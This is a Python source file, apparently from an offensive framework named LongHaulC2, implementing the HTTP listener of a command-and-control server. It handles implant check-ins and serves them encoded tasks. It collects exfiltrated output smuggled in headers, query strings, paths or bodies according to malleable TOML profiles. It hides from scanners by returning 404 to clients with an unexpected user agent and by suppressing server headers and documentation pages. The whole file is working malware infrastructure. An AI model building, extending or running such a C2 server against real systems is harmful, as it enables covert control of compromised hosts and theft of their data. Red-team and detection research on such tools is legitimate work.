"""
LongHaulC2 HTTP Listener (TOML Token Variant)
Strictly Network I/O, Data Extraction, and Transform Routing.
"""

import re
import tomllib

import structlog
import uvicorn
from fastapi import FastAPI, HTTPException, Request, Response

# Abstracted core logic and transforms
from ..listener_bridge import handle_beacon, handle_exfil
from ..transform import apply_python_transforms, reverse_python_transforms

app = FastAPI(
    title="LongHaul C2 HTTP Listener",
    description="Generic TOML-defined C2 endpoints",
    version="2.0.0",
    docs_url=None,
    redoc_url=None,
)

listener_logger = structlog.get_logger("listener")

# Global state
g_profile: dict = {}
g_listener_uuid: str = ""


# ==========================================
# Token Extraction Helpers
# ==========================================
def extract_token_from_string(template: str, actual: str, token: str) -> str | None:
    """
    Extracts a payload from a given string based on a TOML-defined template.
    For example, if the template is "session=<METADATA>", this function generates
    a regex pattern "^session=(.*)$" to safely capture the underlying data.
    """
    if token not in template:
        return None

    # Escape regex specials in the template, then replace the target token with a capture group
    escaped_template = re.escape(template).replace(re.escape(token), "(.*)")
    pattern = f"^{escaped_template}$"

    match = re.search(pattern, actual)
    if match:
        return match.group(1)
    return None


def find_payload(request: Request, client_block: dict, uri_template: str, token: str) -> bytes | None:
    """
    Iterates through the HTTP request components (URI, query parameters, and headers)
    to locate the requested token based on the provided TOML client block structure.
    """
    # Check the URI explicitly for data appended directly to the path
    extracted_uri = extract_token_from_string(uri_template, request.url.path, token)
    if extracted_uri:
        return extracted_uri.encode()

    # Check the query parameters
    for param in client_block.get("parameters", []):
        for k, v in param.items():
            if token in v:
                actual_val = request.query_params.get(k, "")
                extracted = extract_token_from_string(v, actual_val, token)
                if extracted:
                    return extracted.encode()

    # Check the HTTP headers
    for header in client_block.get("headers", []):
        for k, v in header.items():
            if token in v:
                actual_val = request.headers.get(k.lower(), "")
                extracted = extract_token_from_string(v, actual_val, token)
                if extracted:
                    return extracted.encode()

    return None


# ==========================================
# Route Handlers
# ==========================================
async def http_get(request: Request, body_bytes: bytes) -> Response:
    """Handles Beacon check-ins"""
    structlog.contextvars.bind_contextvars(method="GET", ip=request.client.host)
    get_config = g_profile.get("http", {}).get("get", {})
    client_config = get_config.get("client", {})

    allowed_ua = get_config.get("useragent")

    # Force correct user agent on get
    if allowed_ua and request.headers.get("user-agent") != allowed_ua:
        listener_logger.warning("user_agent_mismatch", expected=allowed_ua, actual=request.headers.get("user-agent"))
        return Response(status_code=404)

    # Extract the raw token bytes from the URI, headers, or query parameters
    raw_metadata = find_payload(request, client_config, get_config.get("uri", ""), "<METADATA>")

    # Fallback: Check the HTTP request body if the token was not found in the standard fields.
    # The body is decoded with errors="ignore" to allow string searching without crashing
    # on binary payloads, which will be properly extracted and handled as bytes afterward.
    if not raw_metadata and "<METADATA>" in client_config.get("body", ""):
        raw_string = extract_token_from_string(client_config["body"], body_bytes.decode(errors="ignore"), "<METADATA>")
        if raw_string:
            raw_metadata = raw_string.encode()

    if not raw_metadata:
        listener_logger.warning("Missing <METADATA> in request")
        raise HTTPException(status_code=400, detail="Missing required data")

    # Reverse the applied transformations to retrieve the raw MsgPack payload
    metadata_transforms = client_config.get("metadata", {}).get("transforms", [])
    decoded_metadata = reverse_python_transforms(raw_metadata, metadata_transforms)

    # Pass the decoded payload across the network boundary to the core handler logic
    task_bytes = handle_beacon(decoded_metadata, request.client.host, g_listener_uuid)

    if not task_bytes:
        listener_logger.info("checkin_no_task")
        return Response(status_code=204)

    # Prepare the response data to send back to the implant
    server_config = get_config.get("server", {})
    server_transforms = server_config.get("output", {}).get("transforms", [])

    encoded_tasks = apply_python_transforms(task_bytes, server_transforms)

    # Format the response headers to match the TOML specification
    headers = {list(h.keys())[0]: list(h.values())[0] for h in server_config.get("headers", [])}

    # CRITICAL: The response body must be constructed and passed to FastAPI as raw bytes.
    # If the payload is decoded to a string first, FastAPI will automatically attempt
    # to encode it to UTF-8 before transmitting. This will corrupt high-byte binary
    # values (such as MsgPack array headers like 0x91) by expanding them into multi-byte
    # UTF-8 sequences (e.g., C2 91), causing severe parse errors on the implant side.
    body_template = server_config.get("body", "").encode("utf-8")
    response_body = body_template.replace(b"<OUTPUT>", encoded_tasks)

    return Response(content=response_body, headers=headers)


async def http_post(request: Request, body_bytes: bytes) -> Response:
    """Handles Exfiltrated Task Data"""
    structlog.contextvars.bind_contextvars(method="POST", ip=request.client.host)
    post_config = g_profile.get("http", {}).get("post", {})
    client_config = post_config.get("client", {})

    # Extract the Agent ID and Task Output tokens
    uri_template = post_config.get("uri", "")
    raw_id = find_payload(request, client_config, uri_template, "<CLIENT_ID>")
    raw_output = find_payload(request, client_config, uri_template, "<OUTPUT>")

    # Fallback checks for the POST body
    if not raw_output and "<OUTPUT>" in client_config.get("body", ""):
        extracted_output = extract_token_from_string(
            client_config["body"], body_bytes.decode(errors="ignore"), "<OUTPUT>"
        )
        if extracted_output:
            raw_output = extracted_output.encode()

    if not raw_id and "<CLIENT_ID>" in client_config.get("body", ""):
        extracted_id = extract_token_from_string(
            client_config["body"], body_bytes.decode(errors="ignore"), "<CLIENT_ID>"
        )
        if extracted_id:
            raw_id = extracted_id.encode()

    if not raw_id or not raw_output:
        listener_logger.warning("Missing <CLIENT_ID> or <OUTPUT> in POST request")
        raise HTTPException(status_code=400, detail="Missing required data")

    # Reverse the applied transformations for both the ID and the Output payload
    id_transforms = client_config.get("id", {}).get("transforms", [])
    output_transforms = client_config.get("output", {}).get("transforms", [])

    decoded_id = reverse_python_transforms(raw_id, id_transforms)
    decoded_output = reverse_python_transforms(raw_output, output_transforms)

    # The ID must be bound as a string for structured logging purposes.
    # Latin-1 is used to ensure any stray high-byte characters do not throw decoding errors.
    structlog.contextvars.bind_contextvars(implant_id=decoded_id.decode("latin-1", errors="ignore"))

    # Pass the decoded payload across the network boundary to the core handler logic
    handle_exfil(decoded_output)

    # Prepare the server acknowledgment using raw bytes to prevent UTF-8 corruption
    server_config = post_config.get("server", {})
    headers = {list(h.keys())[0]: list(h.values())[0] for h in server_config.get("headers", [])}

    body_template = server_config.get("body", "").encode("utf-8")
    response_body = body_template.replace(b"<OUTPUT>", b"")

    return Response(content=response_body, headers=headers)


# ==========================================
# Dynamic Router & Entrypoint
# ==========================================
@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "PATCH"])
async def catchall(request: Request, full_path: str):  # noqa
    """Dynamically routes based on the TOML definitions"""
    body_bytes = await request.body()

    # Extract the base URI from the TOML configuration, discarding any query parameters
    # that might be defined inline in the template (e.g., splitting at '?').
    get_uri = g_profile.get("http", {}).get("get", {}).get("uri", "").split("?")[0]
    get_method = g_profile.get("http", {}).get("get", {}).get("method", "GET")

    post_uri = g_profile.get("http", {}).get("post", {}).get("uri", "").split("?")[0]
    post_method = g_profile.get("http", {}).get("post", {}).get("method", "POST")

    actual_path = request.url.path

    # Use .startswith() instead of an exact match to allow for dynamic data
    # that may be appended directly to the URI (e.g., /api/v1/update/<METADATA>).
    if actual_path.startswith(get_uri) and request.method == get_method:
        return await http_get(request, body_bytes)

    if actual_path.startswith(post_uri) and request.method == post_method:
        return await http_post(request, body_bytes)

    listener_logger.debug("URI did not match configured endpoints", path=actual_path, method=request.method)
    return Response(content='{"error": "Not Found"}', status_code=404)


def run(listener_uuid: str, listener_port: int, listener_host: str, listener_profile_contents: str):
    global g_profile, g_listener_uuid
    g_listener_uuid = listener_uuid

    # Load the TOML profile securely into memory for the duration of the listener's lifecycle
    try:
        g_profile = tomllib.loads(listener_profile_contents)
    except Exception as e:
        listener_logger.error("Failed to parse TOML profile on listener boot", error=str(e))
        raise

    listener_logger.info("Starting listener with parsed TOML profile")
    uvicorn.run(app, host=listener_host, port=listener_port, reload=False, server_header=False)
